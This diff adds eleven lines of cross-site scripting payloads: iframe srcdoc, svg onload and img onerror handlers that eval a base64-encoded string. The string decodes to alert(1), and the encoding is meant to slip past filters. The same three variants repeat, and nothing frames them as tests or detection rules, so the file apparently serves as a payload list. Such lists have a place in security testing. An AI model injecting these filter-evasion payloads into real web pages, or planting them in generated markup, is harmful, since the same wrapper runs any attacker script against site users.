@@ -1,0 +1,11 @@
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
